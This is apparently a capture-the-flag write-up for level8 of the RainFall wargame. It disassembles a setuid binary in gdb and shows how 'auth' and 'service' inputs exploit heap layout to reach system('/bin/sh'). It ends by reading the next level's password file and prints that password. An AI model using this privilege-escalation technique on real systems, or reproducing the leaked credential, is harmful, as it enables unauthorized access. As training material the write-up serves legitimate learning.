
# Preparations

Entering level8 home directory we see a level8 binary with sticky bit in access rights.
By objdumping the binary we see only main function:

	level8@RainFall:~$ objdump -D -M intel-mnemonic level8 > /tmp/dump

Why do we do objdump first? Maybe in this exercise a function exists but is not used so we need to see all the functions.

# Code writing

We start to work with gdb in Intel syntax (set disassembly-flavor intel):

	(gdb) disass main
	Dump of assembler code for function main:
	   0x08048564 <+0>:	push   ebp
	   0x08048565 <+1>:	mov    ebp,esp
	   0x08048567 <+3>:	push   edi
	   0x08048568 <+4>:	push   esi
	   0x08048569 <+5>:	and    esp,0xfffffff0
	   0x0804856c <+8>:	sub    esp,0xa0
	   0x08048572 <+14>:	jmp    0x8048575 <main+17> 		;inside two nop it is a cycle
	   0x08048574 <+16>:	nop
	   0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0 	;preparations to printf
	   0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac 	;preparations to printf
	   0x08048581 <+29>:	mov    eax,0x8048810 			;preparations to printf
	   0x08048586 <+34>:	mov    DWORD PTR [esp+0x8],ecx 		;argument to print
	   0x0804858a <+38>:	mov    DWORD PTR [esp+0x4],edx 		;argument to print
	   0x0804858e <+42>:	mov    DWORD PTR [esp],eax 		;argument to print
	   0x08048591 <+45>:	call   0x8048410 <printf@plt>		;call printf
	   0x08048596 <+50>:	mov    eax,ds:0x8049a80 		;preparations to fgets
	   0x0804859b <+55>:	mov    DWORD PTR [esp+0x8],eax 		;preparations to fgets
	   0x0804859f <+59>:	mov    DWORD PTR [esp+0x4],0x80 	;argument to fgets
	   0x080485a7 <+67>:	lea    eax,[esp+0x20] 			;argument to fgets
	   0x080485ab <+71>:	mov    DWORD PTR [esp],eax 		;argument to fgets
	   0x080485ae <+74>:	call   0x8048440 <fgets@plt>		;call fgets
	   0x080485b3 <+79>:	test   eax,eax 				;check what lies in register and leave cycle if nothing is there with je
	   0x080485b5 <+81>:	je     0x804872c <main+456> 		;leaving cycle

	Here starts strcmp:
	   0x080485bb <+87>:	lea    eax,[esp+0x20] 			;deal with buffer
	   0x080485bf <+91>:	mov    edx,eax
	   0x080485c1 <+93>:	mov    eax,0x8048819
	   0x080485c6 <+98>:	mov    ecx,0x5
	   0x080485cb <+103>:	mov    esi,edx 				;is buffer
	   0x080485cd <+105>:	mov    edi,eax 				;is string "auth "
	   0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi] ;comparison untill we reach some value
	   0x080485d1 <+109>:	seta   dl
	   0x080485d4 <+112>:	setb   al
	Information: https://stackoverflow.com/questions/44630262/what-do-the-assembly-instructions-seta-and-setb-do-after-repz-cmpsb/44630741
		0x080485d7 <+115>:	mov    ecx,edx
   		0x080485d9 <+117>:	sub    cl,al
   		0x080485db <+119>:	mov    eax,ecx
   		0x080485dd <+121>:	movsx  eax,al
   		0x080485e0 <+124>:	test   eax,eax
	
	Continue with main process:
   		0x080485e2 <+126>:	jne    0x8048642 <main+222>
   		0x080485e4 <+128>:	mov    DWORD PTR [esp],0x4 	;argument to malloc
   		0x080485eb <+135>:	call   0x8048470 <malloc@plt>	;call malloc
   		0x080485f0 <+140>:	mov    ds:0x8049aac,eax 	;result of malloc into global
   		0x080485f5 <+145>:	mov    eax,ds:0x8049aac 	;deal with global
		0x080485fa <+150>:	mov    DWORD PTR [eax],0x0 	;global becomes 0
   		0x08048600 <+156>:	lea    eax,[esp+0x20] 		;take buffer
   		0x08048604 <+160>:	add    eax,0x5 			;take 5th byte in buffer
   		0x0804860f <+171>:	mov    edx,eax 			;deal with the byte
   		0x08048611 <+173>:	mov    eax,0x0 			;variable becomes 0

	Here starts strlen:
   		0x08048616 <+178>:	mov    ecx,DWORD PTR [esp+0x1c]
   		0x0804861a <+182>:	mov    edi,edx
   		0x0804861c <+184>:	repnz scas al,BYTE PTR es:[edi]
   		0x0804861e <+186>:	mov    eax,ecx
   		0x08048620 <+188>:	not    eax
   		0x08048622 <+190>:	sub    eax,0x1 			;that is some counter that we substitute and look through the buffer

	Continue with main process:
   		0x08048625 <+193>:	cmp    eax,0x1e 		;compare with 30
   		0x08048628 <+196>:	ja     0x8048642 <main+222> 	;if less than 30, we leave
   		0x0804862a <+198>:	lea    eax,[esp+0x20] 		;preparation to strcpy
   		0x0804862e <+202>:	lea    edx,[eax+0x5] 		;argument to strcpy, 5th byte
   		0x08048631 <+205>:	mov    eax,ds:0x8049aac 	;deal with global variable
   		0x08048636 <+210>:	mov    DWORD PTR [esp+0x4],edx 	;argument to strcpy
   		0x0804863a <+214>:	mov    DWORD PTR [esp],eax 	;argument to strcpy
   		0x0804863d <+217>:	call   0x8048460 <strcpy@plt> 	;call strcpy

	One more time strcmp:
   		0x08048642 <+222>:	lea    eax,[esp+0x20]
   		0x08048646 <+226>:	mov    edx,eax
   		0x08048648 <+228>:	mov    eax,0x804881f
   		0x0804864d <+233>:	mov    ecx,0x5
   		0x08048652 <+238>:	mov    esi,edx
   		0x08048654 <+240>:	mov    edi,eax
   		0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   		0x08048658 <+244>:	seta   dl
   		0x0804865b <+247>:	setb   al
   		0x0804865e <+250>:	mov    ecx,edx
   		0x08048660 <+252>:	sub    cl,al
   		0x08048662 <+254>:	mov    eax,ecx
   		0x08048664 <+256>:	movsx  eax,al
   		0x08048667 <+259>:	test   eax,eax

	Continue with main process:
   		0x08048669 <+261>:	jne    0x8048678 <main+276>
   		0x0804866b <+263>:	mov    eax,ds:0x8049aac 	;prepare global variable
   		0x08048670 <+268>:	mov    DWORD PTR [esp],eax 	;argument to free
   		0x08048673 <+271>:	call   0x8048420 <free@plt>	;call free

	One more time strcmp:
   		0x08048678 <+276>:	lea    eax,[esp+0x20]
   		0x0804867c <+280>:	mov    edx,eax
   		0x0804867e <+282>:	mov    eax,0x8048825
   		0x08048683 <+287>:	mov    ecx,0x6
   		0x08048688 <+292>:	mov    esi,edx
   		0x0804868a <+294>:	mov    edi,eax
   		0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   		0x0804868e <+298>:	seta   dl
   		0x08048691 <+301>:	setb   al
   		0x08048694 <+304>:	mov    ecx,edx
   		0x08048696 <+306>:	sub    cl,al
   		0x08048698 <+308>:	mov    eax,ecx
   		0x0804869a <+310>:	movsx  eax,al
   		0x0804869a <+310>:	movsx  eax,al
   		0x0804869d <+313>:	test   eax,eax

	Continue with main process:
   		0x0804869f <+315>:	jne    0x80486b5 <main+337>
   		0x080486a1 <+317>:	lea    eax,[esp+0x20] 		;prepare buffer
   		0x080486a5 <+321>:	add    eax,0x7 			;prepare buffer, 7th byte
   		0x080486a8 <+324>:	mov    DWORD PTR [esp],eax 	;argument to strdup
   		0x080486ab <+327>:	call   0x8048430 <strdup@plt>	;call strdup
   		0x080486b0 <+332>:	mov    ds:0x8049ab0,eax 	;put result to global service

	One more time strcmp:
   		0x080486b5 <+337>:	lea    eax,[esp+0x20]
   		0x080486b9 <+341>:	mov    edx,eax
   		0x080486bb <+343>:	mov    eax,0x804882d
   		0x080486c0 <+348>:	mov    ecx,0x5
   		0x080486c5 <+353>:	mov    esi,edx
   		0x080486c7 <+355>:	mov    edi,eax
   		0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   		0x080486cb <+359>:	seta   dl
   		0x080486ce <+362>:	setb   al
   		0x080486d1 <+365>:	mov    ecx,edx
   		0x080486d3 <+367>:	sub    cl,al
   		0x080486d5 <+369>:	mov    eax,ecx
   		0x080486d7 <+371>:	movsx  eax,al
   		0x080486da <+374>:	test   eax,eax

	Continue with main process:
   		0x080486dc <+376>:	jne    0x8048574 <main+16>
   		0x080486e2 <+382>:	mov    eax,ds:0x8049aac 	;check global auth
   		0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20] ;take 32nd byte
   		0x080486ea <+390>:	test   eax,eax 			;check if it exists
   		0x080486ec <+392>:	je     0x80486ff <main+411>
   		0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833 	;argument to system
   		0x080486f5 <+401>:	call   0x8048480 <system@plt>		;call system
   		0x080486fa <+406>:	jmp    0x8048574 <main+16> 	;to the beginning of the cycle
   		0x080486ff <+411>:	mov    eax,ds:0x8049aa0 	;preparation to fwrite
   		0x08048704 <+416>:	mov    edx,eax 			;preparation to fwrite
   		0x08048706 <+418>:	mov    eax,0x804883b 		;preparation to fwrite
   		0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx 	;argument to fwrite
   		0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa 	;argument to fwrite
   		0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1 	;argument to fwrite
   		0x0804871f <+443>:	mov    DWORD PTR [esp],eax 	;argument to fwrite
   		0x08048722 <+446>:	call   0x8048450 <fwrite@plt>	;call fwrite
   		0x08048727 <+451>:	jmp    0x8048574 <main+16>
   		0x0804872c <+456>:	nop
   		0x0804872d <+457>:	mov    eax,0x0
   		0x08048732 <+462>:	lea    esp,[ebp-0x8]
   		0x08048735 <+465>:	pop    esi
   		0x08048736 <+466>:	pop    edi
   		0x08048737 <+467>:	pop    ebp
   		0x08048738 <+468>:	ret

Something new!\
Let's see some insites by their addresses:

	(gdb) x/s 0x8049ab0
		0x8049ab0 <service>:	 ""
	(gdb) x/s 0x8049aac
		0x8049aac <auth>:	 ""
	(gdb) x/s 0x8048810
		0x8048810:	 "%p, %p \n"
	(gdb) x/s 0x8049a80
		0x8049a80 <stdin@@GLIBC_2.0>:	 "\300", <incomplete sequence \375\267>
	(gdb) x/s 0x8048819
		0x8048819:	 "auth "
	(gdb) x/s 0x804881f
		0x804881f:	 "reset"
	(gdb) x/s 0x8048825
		0x8048825:	 "service"
	(gdb) x/s 0x8048833
		0x8048833:	 "/bin/sh"
	(gdb) x/s 0x8049aa0
		0x8049aa0 <stdout@@GLIBC_2.0>:	 " ", <incomplete sequence \375\267>
	(gdb) x/s 0x804883b
		0x804883b:	 "Password:\n"

Finally let's find out the size of the buffer printing a lot of As for `fgets`:

	(gdb) info frame
		Stack level 0, frame at 0xbffff710:
		 eip = 0x80485b3 in main; saved eip *0xb7e454d3*
		 Arglist at 0xbffff708, args:
		 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
		 Saved registers:
		  ebp at 0xbffff708, esi at 0xbffff700, edi at 0xbffff704, eip at 0xbffff70c
	(gdb) x/70wx $esp
		0xbffff660:	0xbffff680	0x00000080	0xb7fd1ac0	0xb7fd0ff4
		0xbffff670:	0xbffff6be	0xbffff6bf	0x00000001	0xb7ec3c49
		0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff6a0:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff6b0:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
		0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x00414141
		0xbffff700:	0x00000000	0x00000000	0x00000000	*0xb7e454d3*
	(gdb) p 0xbffff700 - 0xbffff680
		$3 = 128

Numbers in hex are transferred to decimal with the help of programming calculator and finally we write the code in C.

# Exploitation

We need to print special strings that will be compared to values with the help of `strcmp`. So let's start:

	(gdb) x/10wx 0x8049aac
		0x8049aac <auth>:	0x0804a008	0x00000000	0x00000000	0x00000000
		0x8049abc:	0x00000000	0x00000000	0x00000000	0x00000000
		0x8049acc:	0x00000000	0x00000000
	(gdb) x/10wx 0x8049ab0
		0x8049ab0 <service>:	0x0804a038	0x00000000	0x00000000	0x00000000
		0x8049ac0:	0x00000000	0x00000000	0x00000000	0x00000000
		0x8049ad0:	0x00000000	0x00000000
	(gdb) p 0x0804a038 - 0x804a008
		$2 = 48

That is how we find out that distance between two globals is 48 bytes.
	
	Starting program: /home/user/level8/level8
		(nil), (nil)
		auth
	Breakpoint 3, 0x08048574 in main ()
	(gdb) x/4s 0x0804a008
		0x804a008:	 "\n"
		0x804a00a:	 ""
		0x804a00b:	 ""
		0x804a00c:	 ""
	(gdb) x/4s 0x0804a038
		0x804a038:	 ""
		0x804a039:	 ""
		0x804a03a:	 ""
		0x804a03b:	 ""
	Continuing.
		0x804a008, (nil)
		service service
	(gdb) x/10xw 0x0804a008
		0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000011
		0x804a018:	0x72657320	0x65636976	0x0000000a	0x00020fe1
		0x804a028:	0x00000000	0x00000000
	(gdb) x/10xw 0x0804a038
		0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a058:	0x00000000	0x00000000
	(gdb) p/x 0x0804a008 + 32
		$3 = 0x804a028

For `system` we need that byte under address 0x804a028 is not null. Let's do it:
	
	(gdb) r
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/user/level8/level8
		(nil), (nil)
		auth

	Breakpoint 3, 0x08048574 in main ()
	(gdb) x/20xw 0x0804a008
		0x804a008:	0x000000|0a|	0x00000000	0x00000000	0x00020ff1
		0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000

We put '\n' and it fills in other 15 bytes as well.
	
	(gdb) c
	Continuing.
		0x804a008, (nil)
		serviceAAAABBBBCCCCDDDDE

	Breakpoint 3, 0x08048574 in main ()
	(gdb) x/20xw 0x0804a008
		0x804a008:	0x000000|0a|	0x00000000	0x00000000	0x00000019
		0x804a018:	0x41414141	0x42424242	0x43434343	0x44444444
		0x804a028:	0x0000|0a45|	0x00020fd9	0x00000000	0x00000000
		0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
		0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000

Now under 0x804a028 lies 'Е' and under 0x804a029 - '\n'.

# Result

    level8@RainFall:~$ ./level8
	(nil), (nil)
	auth
	0x804a008, (nil)
	serviceAAAABBBBCCCCDDDDE
	0x804a008, 0x804a018
	login
	$ whoami
	level9
	$ cat /home/user/level9/.pass
	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a